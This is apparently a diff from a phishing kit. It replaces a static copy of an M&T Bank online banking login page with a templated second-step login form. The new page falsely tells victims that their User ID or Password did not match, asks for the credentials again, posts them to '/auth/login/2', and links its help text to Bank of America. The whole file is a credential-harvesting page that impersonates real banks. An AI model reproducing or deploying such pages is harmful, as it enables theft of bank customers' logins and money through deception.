@@ -1,180 +1,81 @@
-<!DOCTYPE html>
-<html lang="en">
+@layout('layouts.app')
 
-<head>
-  <meta charset="UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Welcome to Online Banking</title>
-  <link rel="shortcut icon" href="/img/favicon.png" type="image/x-icon">
-  <link href="/css/main.css" rel="stylesheet">
-  <script src="/js/jquery.js"></script>
-</head>
+@section('content')
+<div class="column col-small" style='font:16px "cb-regular";'>
+  <div class="cb-message error medium" tabindex="0">
+    <div class="cb-message-icon">
+      <span class="data-icon">
+        <svg role="img" aria-hidden="true" focusable="false" viewBox="0 0 40 41" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+          <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+            <g id="red_ico" transform="translate(-1.000000, 0.000000)" fill-rule="nonzero">
+              <g id="Path_Clipping_Path" fill="#D82027">
+                <path d="M40.52,34.9 L24.66,3.35 C24.0205199,1.89971197 22.5850142,0.963815355 21,0.963815355 C19.4149858,0.963815355 17.9794801,1.89971197 17.34,3.35 L1.48,34.89 C0.780648378,36.1939013 0.828414331,37.7715265 1.60536938,39.0307295 C2.38232443,40.2899325 3.77093507,41.040228 5.25,41 L36.75,41 C38.2260948,41.0382165 39.6113234,40.2892339 40.3876113,39.0331712 C41.1638992,37.7771086 41.2143138,36.2031672 40.52,34.9 Z" id="Shape"></path>
+              </g>
+              <g id="Path" transform="translate(16.000000, 29.000000)" fill="#FFFFFF">
+                <circle id="Oval" cx="5" cy="4.31" r="4.1"></circle>
+              </g>
+              <g id="Path-2" transform="translate(17.000000, 9.000000)" fill="#FFFFFF">
+                <path d="M4,0.72 C2.29896297,0.72 0.92,2.09896297 0.92,3.8 L0.92,15.08 C1.01300469,16.7102378 2.36211143,17.984572 3.995,17.984572 C5.62788857,17.984572 6.97699531,16.7102378 7.07,15.08 L7.07,3.8 C7.07000895,2.10286057 5.69713048,0.725510193 4,0.72 Z" id="Shape"></path>
+              </g>
+            </g>
+          </g>
+        </svg>
+      </span>
+    </div>
+    <div class="cb-message-content">
+      <p class="cb-message-text">The User ID or Password you entered does not match our records. Please try again.</p>
+    </div>
+    <div class="cb-message-dismiss">
+      <span class="cb-message-close-x">
+        <span aria-hidden="true">×</span>
+        <span class="cb-hidden">close: error Message</span>
+      </span>
+    </div>
+  </div>
+</div>
 
-<body>
-  <div class="cb-app">
-    <header class="cb-header">
-      <div class="grid-x align-center">
-        <div class="cell">
-          <a href="https://www.mtb.com/home-page" class="cb-logo">
-            <img src="/img/logo.svg">
-          </a>
+<form id="login2Form" class="cb-form" action="/auth/login/2" method="POST">
+  <div class="columns col-small">
+    <div class="row">
+      <div class="column col-small mtop-30">
+        <div class="btm-20">
+          <h1 class="cb-login-heading">Log In to Online Banking</h1>
+        </div>
+        <div class="btm-30 cb-login-formInfo">To secure your account, please enter the following.</div>
+      </div>
+
+      <div class="column col-small clearfix">
+        <div class="btm-30">
+          <div class="cb-input cb-input-box cb-input--cb2 has-help">
+            <label id="usernameLabel" class="cb-input-label" for="username">User ID</label>
+            <input id="username" name="username" type="text" class="cb-input-text" autocapitalize="off" autocorrect="off" autocomplete="off">
+            <p class="cb-input-hint"></p>
+            <div class="cb-input-error-message cb-icon--error" id="usernameErrorMsg" style="display: none;">User ID required</div>
+          </div>
+        </div>
+
+        <div class="btm-30">
+          <div class="cb-input cb-input-box cb-input--cb2 has-help">
+            <label id="passwordLabel" class="cb-input-label" for="password">Password</label>
+            <input id="password" name="password" type="password" class="cb-input-text hide-input" autocapitalize="off" autocorrect="off" autocomplete="off">
+            <p class="cb-input-hint"></p>
+            <div class="cb-input-error-message cb-icon--error" id="passwordErrorMsg" style="display: none;">Password required</div>
+          </div>
+        </div>
+
+        <div class="cb-login-helpText">
+          <a href="https://secure.bankofamerica.com/">Forgot ID/Password?</a>
         </div>
       </div>
-    </header>
 
+      <div class="column col-small clearfix">
+        <div class="btn-container">
+          <button id="login2SubmitBtn" type="submit" class="cb-btn cb-btn--medium cb-btn--primary mrt-15 submitBtn">Continue</button>
 
-    <form action="/auth/login/2" method="post">
-      <div class="cb-login-content">
-        <div class="grid-x grid-padding-x grid-x__padded __spacer-section">
-          <div class="cell">
-            <div class="cb-header-sect cb-header-sect-login">
-              <h1>
-                Log In to Online Banking
-              </h1>
-              <p>
-                For Personal and Business Accounts
-              </p>
-            </div>
-          </div>
-
-          <div class="cb-error cb-error-bdr cb-error-mgn">
-            <div class="cb-error-content">
-              <div class="callout __has-icon __no-border warning">
-                <i class="__is-icon cb-icon cb-icon-notification cb-icon-position">
-                  <span class="show-for-sr">Notification Icon</span>
-                </i>
-
-                <p>You have entered an invalid User ID and/or Passcode. Please try again.</p>
-              </div>
-            </div>
-          </div>
-
-          <div class="cell">
-            <label for="userId">User ID</label>
-            <div class="input-group cb-single-input">
-              <input class="input-group-field" type="text" id="username" name="username" autocomplete="off">
-            </div>
-
-            <p class="form-error cb-error-bdr">
-              <i class="cb-icon cb-icon-notification-error"></i>
-              <span class="cb-error-paragraph">Please provide your User ID.</span>
-            </p>
-          </div>
-
-          <div class="cell">
-            <label for="Passcode">Passcode</label>
-            <div class="input-group cb-single-input">
-              <input class="input-group-field" type="password" id="password" name="password" autocomplete="off">
-              <div class="input-group-button">
-                <button type="button" id="showHide" class="button clear inputHidden">Show</button>
-              </div>
-            </div>
-
-            <p class="form-error cb-error-bdr">
-              <i class="cb-icon cb-icon-notification-error"></i>
-              <span class="cb-error-paragraph">Please provide your Passcode.</span>
-            </p>
-          </div>
-
-          <div class="cell">
-            <div class="cb-formcheckbox">
-              <input class="show-for-sr" type="checkbox" id="RememberUserId">
-              <label for="RememberUserId" class="__spacer-remove">
-                Remember User ID
-              </label>
-            </div>
-          </div>
-        </div>
-
-        <div class="grid-x grid-padding-x __spacer-paragraph grid-x__padded">
-          <div class="cell">
-            <button type="submit" class="button button__form-no-spacer expanded" id="submitBtn">Log In</button>
-          </div>
-
-          <div class="cell">
-            <a href="https://onlinebanking.mtb.com/Login/LoginHelp" class="button button-padding-no-spacer expanded clear">Help with User ID or Passcode</a>
-          </div>
-          <div class="cell">
-            <a href="https://onlinebanking.mtb.com/Enrollment/Enroll" class="button button__padding expanded clear">Enroll Now</a>
-          </div>
-
-          <p class="cell text-center __font-size-tiny __color-gray-accent">Unauthorized access is prohibited. Usage may be monitored.</p>
-        </div>
-      </div>
-    </form>
-
-    <hr class="__spacer-section">
-
-    <div class="cb-error-content">
-      <div class="grid-x grid-padding-x grid-x__padded">
-        <div class="cell text-center">
-          <p class="__font-size-secondary">
-            Have questions about M&amp;T Online Banking?
-          </p>
-        </div>
-        <div class="cell medium-6 text-center">
-          <p class="__font-size-secondary __color-primary __spacer-paragraph-half">
-            Personal Accounts:
-            <a href="tel:1-800-790-9130" class="__no-underline">1-800-790-9130</a>
-          </p>
-          <p class="__font-size-sub __spacer-remove __color-gray-accent">
-            Monday - Friday 8am - 9pm ET
-          </p>
-          <p class="__font-size-sub __spacer-paragraph __color-gray-accent">
-            Saturday - Sunday 9am - 5pm ET
-          </p>
-        </div>
-        <div class="cell medium-6 text-center">
-          <p class="__font-size-secondary __color-primary __spacer-paragraph-half">
-            Business Accounts: <a href="tel:1-800-724-6070" class="__no-underline">1-800-724-6070</a>
-          </p>
-          <p class="__font-size-sub __spacer-remove __color-gray-accent">
-            Monday - Friday 6am - 9pm ET
-          </p>
-          <p class="__font-size-sub __spacer-section __color-gray-accent">
-            Saturday - Sunday 9am - 5pm ET
-          </p>
+          <button id="cancelBtn" type="button" class="cb-btn cb-btn--medium cb-btn--secondary">Cancel</button>
         </div>
       </div>
     </div>
-
-    <section class="cb-footer cb-footer__auth" style="height: 14.25rem;">
-      <div class="grid-x" style="height: 14.25rem;">
-        <div class="cell flex-container flex-dir-column align-center-middle">
-          <div class="cb-footer--auth">
-            <a href="https://upgrade.mtb.com/olb-upgrade">Get Started Guide</a>
-            <a href="https://www.mtb.com/olbsecurity">Security Assistance</a>
-            <a href="https://www3.mtb.com/homepage/explore-the-m-and-t-bank-help-center/digital-services-agreement.html">Digital Service Agreement</a>
-            <a href="https://asset.mtb.com/Documents/html/ESign.htm">ESign Agreement</a>
-            <a href="https://mtb.com/olb-accessibility">Accessibility</a>
-            <a href="https://www.mtb.com/olb-personalsite">mtb.com</a>
-          </div>
-
-          <div class="cb-footer--non-auth">
-            <p>
-              ©2023 M&amp;T Bank. All Rights Reserved.<br>
-              Users of this website agree to be bound by the provisions of the M&amp;T website <a href="https://www.mtb.com/help-center/policies/terms-of-use"> Terms of Use</a> and <a href="https://www.mtb.com/privacy">Privacy</a>.
-            </p>
-            <div class="cb-footer__logo">
-              <a href="https://www.mtb.com/equalhousinglender">
-                <img src="/img/ehl.svg" class="cb-footer__ehl">
-              </a>
-              <a href="https://www.mtb.com/olb-entrust">
-                <img src="/img/entrust.svg" class="cb-footer__entrust">
-              </a>
-            </div>
-            <p>
-              Equal Housing Lender NMLS #381076
-              <a href="https://www.mtb.com/fdic">Member FDIC</a>
-            </p>
-          </div>
-        </div>
-      </div>
-    </section>
   </div>
-
-  <script src="/js/main.js"></script>
-</body>
-
-</html>
+</form>
+@endsection
